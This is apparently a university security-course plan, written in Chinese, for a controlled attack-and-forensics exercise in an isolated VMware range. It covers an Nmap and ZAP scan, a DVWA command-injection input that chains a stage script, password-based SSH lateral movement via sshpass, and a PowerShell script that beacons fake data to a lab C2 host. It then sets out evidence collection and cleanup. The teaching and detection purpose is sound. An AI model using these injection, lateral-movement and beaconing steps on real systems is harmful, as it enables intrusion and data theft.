# CASE01 攻击者视角完整攻击与取证方案

> 环境：VMware 隔离靶场  
> 正式运行编号：CASE01-RUN-FINAL-01  
> 最终证据目录：G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\  
> 执行人：成员 E

## 1. 实验目标

本次正式运行只从 Attack 机器发起操作，形成一条连续、可回溯的受控攻击链：

~~~text
Attack
  -> Nmap 发现靶场服务
  -> ZAP 访问 DVWA
  -> DVWA Command Injection
  -> Web 执行预置无害阶段脚本
  -> Web 自动 SSH 登录 Win10
  -> Win10 访问 Core 测试文件
  -> Win10 访问隔离 C2
  -> 保存多主机日志、OPNsense 日志、PCAP和截图
~~~

本实验使用 DVWA、专用测试账号、固定 Beacon 和虚假数据。阶段脚本只访问指定靶场地址，不下载恶意文件、不建立真实持久化、不连接真实互联网。

## 2. 节点和地址

| 节点 | 地址 | 网络 | 作用 |
|---|---|---|---|
| Attack | 10.10.10.10 | VMnet17 | 扫描、ZAP、触发漏洞 |
| OPNsense WAN | 10.10.10.1 | VMnet17 | 外部测试网网关 |
| C2 | 10.10.10.20:8080 | VMnet17 | 接收 Beacon |
| OPNsense DMZ | 10.10.20.1 | VMnet18 | DMZ 网关 |
| Web | 10.10.20.10:80/8088 | VMnet18 | Nginx、DVWA、阶段脚本 |
| Email | 10.10.20.20:25 | VMnet18 | Postfix SMTP |
| OPNsense LAN | 10.10.30.1 | VMnet19 | 内网网关 |
| Win10 | 10.10.30.10:22 | VMnet19 | 跳板机和 Windows 日志来源 |
| Core | 10.10.30.20:9100 | VMnet19 | 测试文件服务和 Linux auditd |

最终路径：

~~~text
Attack -> Web -> Win10 -> Core
                         -> C2
~~~

Email 作为 DMZ 辅助服务，在 Attack 上完成一次 SMTP 访问，产生扫描、服务和防火墙证据。

## 3. 证据目录

本轮所有文件统一放到：

~~~text
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\
├── 00-meta\
├── 01-attacker\
├── 02-firewall\
├── 03-web\
├── 04-office-win\
├── 05-core-server\
├── 06-c2\
├── 07-network\
└── screenshots\
~~~

旧的 E\CASE01\raw 文件不混入本轮。

最终文件建议：

~~~text
00-meta/run-info.txt
00-meta/cleanup.txt
01-attacker/nmap-final.txt
01-attacker/zap-report.html
01-attacker/email-test.txt
02-firewall/rules-final.png
02-firewall/opnsense-log.txt
03-web/web-stage.log
03-web/web-process-audit.txt
03-web/web-file-audit.txt
03-web/web-network-audit.txt
03-web/nginx-access.log
04-office-win/security-final.evtx
04-office-win/system-final.evtx
04-office-win/audit-policy-final.txt
04-office-win/win10-jump.log
05-core-server/core-service.log
05-core-server/core-file-audit.txt
05-core-server/core-process-audit.txt
05-core-server/core-network-audit.txt
06-c2/c2-beacon-final.log
07-network/attack-traffic.pcap
07-network/web-traffic.pcap
07-network/core-traffic.pcap
07-network/c2-traffic.pcap
hashes.sha256
~~~

## 4. 正式运行前配置

这部分只做一次。完成后为 Web、Win10、Core、C2 和 OPNsense 创建干净快照。

### 4.1 OPNsense 规则

只启用以下规则，并勾选 Log：

| 方向 | 来源 | 目标 | 端口 |
|---|---|---|---|
| WAN 到 DMZ | 10.10.10.10 | 10.10.20.10 | TCP/8088 |
| WAN 到 DMZ | 10.10.10.10 | 10.10.20.20 | TCP/25 |
| DMZ 到 LAN | 10.10.20.10 | 10.10.30.10 | TCP/22 |
| LAN 到 WAN | 10.10.30.10 | 10.10.10.20 | TCP/8080 |

禁用旧规则：

~~~text
10.10.20.10 -> 10.10.30.20:9981
~~~

Win10 和 Core 在同一 VMnet19，Win10 到 Core 的 TCP/9100 不经过 OPNsense。

保存规则截图：

~~~text
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\02-firewall\rules-final.png
~~~

### 4.2 Web 保存 Win10 登录密码

在 Web 执行：

~~~bash
sudo apt install -y openssh-client sshpass
read -rsp "请输入 Win10 case01demo 密码: " CASE01_WIN10_PASSWORD
echo
printf '%s\n' "$CASE01_WIN10_PASSWORD" > /home/mxy/.case01-win10-pass
unset CASE01_WIN10_PASSWORD
chmod 600 /home/mxy/.case01-win10-pass
~~~

测试：

~~~bash
sshpass -f /home/mxy/.case01-win10-pass ssh -p 22 -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no case01demo@10.10.30.10 "hostname && whoami"
~~~

应输出 Win10 hostname 和 case01demo 用户名。密码不写入报告、截图或日志。

### 4.3 Win10 跳板脚本

在 Win10 PowerShell 执行：

~~~powershell
New-Item -ItemType Directory -Force "C:\CASE01\evidence" | Out-Null
notepad "C:\CASE01\jump.ps1"
~~~

写入：

~~~powershell
$Run = "CASE01-RUN-FINAL-01"
$Dir = "C:\CASE01\evidence\$Run"
New-Item -ItemType Directory -Force $Dir | Out-Null
$Log = Join-Path $Dir "win10-jump.log"
"=== CASE01 Win10 jump ===" | Set-Content $Log
Get-Date -Format o | Add-Content $Log
hostname | Add-Content $Log
whoami | Add-Content $Log
"=== Core response ===" | Add-Content $Log
$core = & curl.exe -sS --connect-timeout 5 -w "HTTP_STATUS:%{http_code}" "http://10.10.30.20:9100/finance_demo.txt" 2>&1
$core | Add-Content $Log
"=== C2 response ===" | Add-Content $Log
$c2 = & curl.exe -sS --connect-timeout 5 -w "HTTP_STATUS:%{http_code}" "http://10.10.10.20:8080/test-beacon?data=CASE01_WIN10_FAKE_DATA" 2>&1
$c2 | Add-Content $Log
Get-Date -Format o | Add-Content $Log
Get-Content $Log
~~~

预演一次，确认 Core 和 C2 都返回 200。预演完成后删除目录：

~~~powershell
Remove-Item -Recurse -Force "C:\CASE01\evidence\CASE01-RUN-FINAL-01"
~~~

正式运行前不要再次手动执行脚本。

### 4.4 Web 阶段脚本

在 Web 执行：

~~~bash
sudo nano /home/mxy/case01-stage.sh
~~~

写入：

~~~bash
#!/usr/bin/env bash
set -u
BASE=/home/mxy/case01-evidence/CASE01-RUN-FINAL-01
mkdir -p "$BASE"
LOG="$BASE/web-stage.log"
{
  echo "=== CASE01 Web stage ==="
  date -Ins
  hostname
  id
  sshpass -f /home/mxy/.case01-win10-pass ssh -p 22 -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no case01demo@10.10.30.10 'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File C:\\CASE01\\jump.ps1'
  echo "stage_exit=$?"
  date -Ins
} >> "$LOG" 2>&1
~~~

设置权限：

~~~bash
sudo chmod 755 /home/mxy/case01-stage.sh
~~~

正式运行时只能由 Attack 的 DVWA 命令注入触发此脚本。

### 4.5 Linux auditd

Web 已有规则，直接使用，不要重复添加：

~~~text
case01_process
case01_file
case01_network
~~~

Core 已有规则，直接使用，不要重复添加：

~~~text
case01_lateral_file
case01_lateral_exec
case01_network
~~~

分别检查：

~~~bash
sudo auditctl -l | grep case01
~~~

### 4.6 Win10 审计

在 Win10 管理员 PowerShell 执行：

~~~powershell
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Filtering Platform Connection" /success:enable
auditpol /set /subcategory:"Logon" /success:enable
auditpol /set /subcategory:"File System" /success:enable
New-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Force | Out-Null
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name ProcessCreationIncludeCmdLine_Enabled -PropertyType DWord -Value 1 -Force
auditpol /get /category:*
~~~

## 5. 正式攻击执行

### 5.1 启动服务

按顺序启动 OPNsense、Web、Email、Win10、Core、C2 和 Attack。

Web：

~~~bash
cd /opt/dvwa
php -S 10.10.20.10:8088 -t /opt/dvwa
~~~

Core：

~~~bash
cd ~/case01-core
python3 core_server.py
~~~

C2：

~~~bash
cd ~/case01-c2
python3 c2_test.py
~~~

Email：

~~~bash
sudo systemctl enable --now postfix
~~~

服务检查：

~~~bash
ss -lntp | grep -E ':8088|:9100|:8080'
sudo ss -lntp | grep ':25'
~~~

Win10：

~~~powershell
Get-Service sshd,EventLog
Get-NetTCPConnection -LocalPort 22 -State Listen
~~~

### 5.2 启动抓包

Attack：

~~~bash
mkdir -p ~/case01-run-final
date -Ins | tee ~/case01-run-final/start-time.txt
sudo tcpdump -i ens33 -nn -s 0 -w ~/case01-run-final/attack-traffic.pcap 'host 10.10.10.10 and host 10.10.20.10'
~~~

Web：

~~~bash
sudo tcpdump -i any -nn -s 0 -w ~/case01-run-final/web-traffic.pcap 'host 10.10.20.10 and host 10.10.30.10'
~~~

Core：

~~~bash
sudo tcpdump -i any -nn -s 0 -w ~/case01-run-final/core-traffic.pcap 'host 10.10.30.10 and host 10.10.30.20'
~~~

C2：

~~~bash
sudo tcpdump -i any -nn -s 0 -w ~/case01-run-final/c2-traffic.pcap 'host 10.10.30.10 and host 10.10.10.20'
~~~

四个窗口都显示 listening 后截图：

~~~text
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\screenshots\capture-start-attack.png
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\screenshots\capture-start-web.png
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\screenshots\capture-start-core.png
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\screenshots\capture-start-c2.png
~~~

### 5.3 Attack 扫描 Email

在 Attack 执行：

~~~bash
nmap -Pn -sT -T2 --max-retries 1 --scan-delay 200ms --reason -p 22,25,80,8080,8088,9100 10.10.10.1 10.10.10.20 10.10.20.10 10.10.20.20 -oN ~/case01-run-final/nmap-final.txt
printf 'QUIT\r\n' | nc -v 10.10.20.20 25 2>&1 | tee ~/case01-run-final/email-test.txt
~~~

保存到：

~~~text
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\01-attacker\
~~~

扫描结果截图：

~~~text
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\screenshots\nmap-final.png
~~~

### 5.4 Attack 使用 ZAP

ZAP 只扫描：

~~~text
http://10.10.20.10:8088/
~~~

先在 Attack Ubuntu 导出：

~~~text
/home/mxy/case01-run-final/zap-report.html
~~~

再复制到：

~~~text
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\01-attacker\zap-report.html
~~~

保存告警截图：

~~~text
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\screenshots\zap-report.png
~~~

### 5.5 Attack 通过 DVWA 触发完整链

Attack 浏览器直接打开：

~~~text
http://10.10.20.10:8088/login.php
~~~

登录：

~~~text
用户名：admin
密码：password
~~~

进入 DVWA Security，确认安全级别为 Low，再进入 Command Injection。

输入：

~~~text
127.0.0.1 && /home/mxy/case01-stage.sh
~~~

点击 Submit。

此时应发生：

~~~text
Attack 浏览器发出请求
  -> DVWA 在 Web 执行 case01-stage.sh
  -> Web 使用 sshpass 登录 Win10
  -> Win10 执行 jump.ps1
  -> Win10 访问 Core
  -> Win10 访问 C2
~~~

保存攻击触发截图：

~~~text
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\screenshots\attack-trigger.png
~~~

不要在 Web、Win10 或 Core 终端手动执行阶段脚本。

### 5.6 核对结果

Web：

~~~bash
tail -n 40 /home/mxy/case01-evidence/CASE01-RUN-FINAL-01/web-stage.log
~~~

Win10：

~~~powershell
Get-Content "C:\CASE01\evidence\CASE01-RUN-FINAL-01\win10-jump.log"
~~~

预期出现：

~~~text
Core response
CASE01_DEMO_FILE
HTTP_STATUS:200
C2 response
CASE01 harmless test beacon received
HTTP_STATUS:200
~~~

C2：

~~~bash
tail -n 20 ~/case01-c2/beacon.log
~~~

预期出现：

~~~text
src=10.10.30.10
path=/test-beacon?data=CASE01_WIN10_FAKE_DATA
~~~

保存 Win10 结果截图：

~~~text
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\screenshots\win10-jump-result.png
~~~

## 6. 停止抓包和导出日志

确认所有节点出现本轮时间后，在四个 tcpdump 窗口分别按 Ctrl+C。

检查：

~~~bash
ls -lh ~/case01-run-final/*.pcap
~~~

四个 PCAP 都应大于 0。

Web：

~~~bash
sudo ausearch -k case01_process -i > ~/case01-run-final/web-process-audit.txt
sudo ausearch -k case01_file -i > ~/case01-run-final/web-file-audit.txt
sudo ausearch -k case01_network -i > ~/case01-run-final/web-network-audit.txt
cp /home/mxy/case01-evidence/CASE01-RUN-FINAL-01/web-stage.log ~/case01-run-final/web-stage.log
sudo cp /var/log/nginx/access.log ~/case01-run-final/nginx-access.log 2>/dev/null || true
~~~

Core：

~~~bash
sudo ausearch -k case01_lateral_file -i > ~/case01-run-final/core-file-audit.txt
sudo ausearch -k case01_lateral_exec -i > ~/case01-run-final/core-process-audit.txt
sudo ausearch -k case01_network -i > ~/case01-run-final/core-network-audit.txt
sudo cp /var/log/auth.log ~/case01-run-final/core-auth.log 2>/dev/null || true
~~~

Win10：

~~~powershell
wevtutil epl Security "C:\CASE01\evidence\CASE01-RUN-FINAL-01\security-final.evtx"
wevtutil epl System "C:\CASE01\evidence\CASE01-RUN-FINAL-01\system-final.evtx"
auditpol /get /category:* | Out-File -Encoding utf8 "C:\CASE01\evidence\CASE01-RUN-FINAL-01\audit-policy-final.txt"
~~~

C2：

~~~bash
mkdir -p ~/case01-run-final
cp ~/case01-c2/beacon.log ~/case01-run-final/c2-beacon-final.log
~~~

## 7. 归档到 Windows 主机

通过 VMware 共享文件夹复制：

~~~text
Attack 的 ~/case01-run-final/* -> G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\01-attacker\
Web 的 ~/case01-run-final/* -> G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\03-web\
Win10 的 C:\CASE01\evidence\CASE01-RUN-FINAL-01\* -> G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\04-office-win\
Core 的 ~/case01-run-final/* -> G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\05-core-server\
C2 的 ~/case01-run-final/* -> G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\06-c2\
~~~

四个 PCAP 复制到：

~~~text
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\07-network\
~~~

OPNsense 截图和日志复制到：

~~~text
G:\信息安全课程设计\E\work\CASE01-RUN-FINAL-01\02-firewall\
~~~

## 8. 证据对应关系

| 阶段 | 关键证据 | 证明内容 |
|---|---|---|
| 扫描 | nmap-final.txt、attack-traffic.pcap、nmap-final.png | Attack 发现靶场服务 |
| Web 漏洞 | zap-report.html、attack-trigger.png、nginx-access.log | Attack 触发 DVWA |
| Web 执行 | web-stage.log、web-process-audit.txt、web-file-audit.txt | Web 执行阶段脚本 |
| Web 到 Win10 | OPNsense 日志、Win10 Security.evtx、web-traffic.pcap | Web 连接并登录 Win10 |
| Win10 到 Core | win10-jump.log、Core 服务日志、core-traffic.pcap | Win10 访问测试文件 |
| Win10 到 C2 | c2-beacon-final.log、Win10日志、c2-traffic.pcap | Win10 Beacon 和虚假数据 |
| 主机行为 | Web/Core auditd、Win10 EVTX | 进程、文件、登录和网络行为 |

## 9. 完成判定

只有同时满足以下条件，才能把本轮写成“攻击者视角的完整受控攻击链”：

- Nmap 由 Attack 执行；
- ZAP 只扫描 10.10.20.10:8088；
- DVWA 命令注入由 Attack 触发；
- Web 日志出现阶段脚本和 SSH 行为；
- Win10 日志出现 case01demo 登录；
- Win10 跳板日志出现 Core 200 和 CASE01_DEMO_FILE；
- Core 日志出现来自 10.10.30.10 的文件访问；
- C2 日志出现 src=10.10.30.10 和固定测试数据；
- 四份 PCAP 均大于 0；
- 所有文件位于 CASE01-RUN-FINAL-01；
- Web 到 Core:9981 直连规则保持禁用；
- 关键记录时间属于同一次正式运行。

缺少任一项时，报告写“分阶段验证”。

## 10. 清理

完成证据复制后：

~~~powershell
Remove-Item -Recurse -Force "C:\CASE01\evidence\CASE01-RUN-FINAL-01"
~~~

Web：

~~~bash
rm -f /home/mxy/.case01-win10-pass
rm -f /home/mxy/case01-stage.sh
~~~

禁用临时 OPNsense 规则，关闭测试服务，恢复干净快照。保留最终证据目录和 PCAP。

